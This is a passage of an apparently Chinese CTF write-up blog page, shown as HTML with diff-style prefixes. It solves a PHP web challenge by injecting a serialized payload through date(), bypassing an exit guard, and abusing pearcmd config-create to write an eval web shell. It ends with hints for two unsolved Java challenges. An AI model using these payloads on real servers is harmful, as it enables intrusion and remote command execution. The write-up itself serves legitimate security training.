+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$code</span><span class="o">=</span><span class="mi">2222</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$password</span><span class="o">=</span><span class="s2">&#34;2222&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$code</span><span class="o">.</span><span class="nv">$password</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出内容作为密码，然后建立数据：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502272025543.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250227202542494"
+	
+	
+></p>
+<p>然后直接登录即可：username:fupanc password:2222 code:2222。</p>
+<p>这样就能够进入index.php页面进行文件包含了，为了能够控制date()函数传参，需要加一个<code>\</code>，这里直接用脚本来分割：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">input_str</span> <span class="o">=</span> <span class="s1">&#39;xxxxxxx&#34;;s:4:&#34;time&#34;;s:5:&#34;11112&#34;;s:10:&#34;background&#34;;s:37:&#34;../../../../usr/local/lib/php/pearcmd&#34;;}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">output_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s1">&#39;</span><span class="se">\\</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s1">&#39;</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">input_str</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">output_str</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\x\x\x\x\x\x\x\&#34;\;\s\:\4\:\&#34;\t\i\m\e\&#34;\;\s\:\5\:\&#34;\1\1\1\1\2\&#34;\;\s\:\1\0\:\&#34;\b\a\c\k\g\r\o\u\n\d\&#34;\;\s\:\3\7\:\&#34;\.\.\/\.\.\/\.\.\/\.\.\/\u\s\r\/\l\o\c\a\l\/\l\i\b\/\p\h\p\/\p\e\a\r\c\m\d\&#34;\;\}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从代码逻辑中可以得到传两次，一次写入文件，一次读取为文件从而包含：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;./cache.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$check</span><span class="o">=</span><span class="k">new</span> <span class="nx">checkin</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;reason&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug_buka&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$time</span><span class="o">=</span><span class="nx">date</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug_buka&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$time</span><span class="o">=</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d H:i:s&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$arraya</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="o">=&gt;</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span><span class="s2">&#34;reason&#34;</span><span class="o">=&gt;</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;reason&#39;</span><span class="p">],</span><span class="s2">&#34;time&#34;</span><span class="o">=&gt;</span><span class="nv">$time</span><span class="p">,</span><span class="s2">&#34;background&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;ok&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$check</span><span class="o">-&gt;</span><span class="na">writec</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d&#34;</span><span class="p">),</span><span class="nv">$arraya</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;check&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$cachefile</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/cache/&#39;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d&#34;</span><span class="p">)</span><span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$cachefile</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$data</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$cachefile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$checkdata</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;?php exit;//&#34;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$check</span><span class="o">=</span><span class="s2">&#34;/var/www/html/&#34;</span><span class="o">.</span><span class="nv">$checkdata</span><span class="p">[</span><span class="s1">&#39;background&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">include</span> <span class="s2">&#34;</span><span class="si">$check</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一次传参如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">get传参：debug_buka=\x\x\x\x\x\x\x\&#34;\;\s\:\4\:\&#34;\t\i\m\e\&#34;\;\s\:\5\:\&#34;\1\1\1\1\2\&#34;\;\s\:\1\0\:\&#34;\b\a\c\k\g\r\o\u\n\d\&#34;\;\s\:\3\7\:\&#34;\.\.\/\.\.\/\.\.\/\.\.\/\u\s\r\/\l\o\c\a\l\/\l\i\b\/\p\h\p\/\p\e\a\r\c\m\d\&#34;\;\}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">post传参：reason=&lt;?php exit;//&lt;?php exit;//
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有符号，注意url编码，如下:</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502272049742.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250227204937671"
+	
+	
+></p>
+<p>第二次传参：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">get传参</span><span class="err">：?</span><span class="o">+</span><span class="n">config</span><span class="o">-</span><span class="n">create</span><span class="o">+/&amp;</span><span class="n">check</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;/&lt;</span><span class="err">?</span><span class="o">=</span><span class="err">@</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;+/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="mf">1234.</span><span class="n">php</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502272054435.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250227205404367"
+	
+	
+></p>
+<p>这里简单注意一下格式吧，这个config-create不是有两种格式吗，另外一种格式只有官方wp那样可以写进去。</p>
+<p>最后进行命令执行即可：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502272055625.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250227205543549"
+	
+	
+></p>
+<p>同样拿到flag。</p>
+<p>后面的两道java题打的时候没打出来，就后面学了再来复现吧。</p>
+<h3 id="jtools">Jtools
+</h3><p>Java Tools</p>
+<p>————————————</p>
+<h3 id="espresso-coffee">Espresso Coffee
+</h3><p>Buy me a cup of Espresso Coffee plz! Here are some JDK download links you may need</p>
+<p><a class="link" href="https://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-linux-amd64.tar.gz"  target="_blank" rel="noopener"
+    >https://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-linux-amd64.tar.gz</a></p>
+<p><a class="link" href="https://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-linux-aarch64.tar.gz"  target="_blank" rel="noopener"
+    >https://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-linux-aarch64.tar.gz</a></p>
+<p><a class="link" href="https://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-macos-amd64.tar.gz"  target="_blank" rel="noopener"
+    >https://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-macos-amd64.tar.gz</a></p>
+<p><a class="link" href="https://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-macos-aarch64.tar.gz"  target="_blank" rel="noopener"
+    >https://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-macos-aarch64.tar.gz</a></p>
+<p><a class="link" href="https://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-windows-amd64.zip"  target="_blank" rel="noopener"
+    >https://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-windows-amd64.zip</a></p>
+<p>hint：</p>
+<ol>
+<li>
+<p>Focus on the fields of org.graalvm.continuations.ContinuationImpl.FrameRecord</p>
+</li>
+<li>
+<p>Abuse org.graalvm.continuations.ContinuationImpl#stackFrameHead =&gt; Hijack the Control Flow =&gt; &ldquo;ROP&rdquo;</p>
+</li>
+<li>
+<p>Command Exec Gadget</p>
+</li>
+<li>
+<p>sun.print.UnixPrintJob</p>
+</li>
+</ol>
+<p>————————</p>
+<p>官方wp：</p>
+<p><a class="link" href="https://xz.aliyun.com/news/17029?time__1311=eqUxn7DQoYqGT4mqGXnjAD97YGOzO1tH4D&amp;u_atoken=fcc01ab1aceadb0f15326e34dbaa7b49&amp;u_asig=1a0c399b17406473291628172e011d"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/news/17029?time__1311=eqUxn7DQoYqGT4mqGXnjAD97YGOzO1tH4D&u_atoken=fcc01ab1aceadb0f15326e34dbaa7b49&u_asig=1a0c399b17406473291628172e011d</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E7%AC%AC%E4%BA%94%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">第五届“长城杯”网络安全大赛WEB题解</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025%E6%B9%BE%E5%8C%BA%E6%9D%AFweb%E5%85%A8%E8%A7%A3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025湾区杯web全解</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%B0%81%E7%A5%9E%E5%8F%B0ctf/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">第九届封神台ctf</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">第十届上海市大学生网络安全大赛wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/n1ctf-junior-2025/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">N1CTF Junior 2025</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
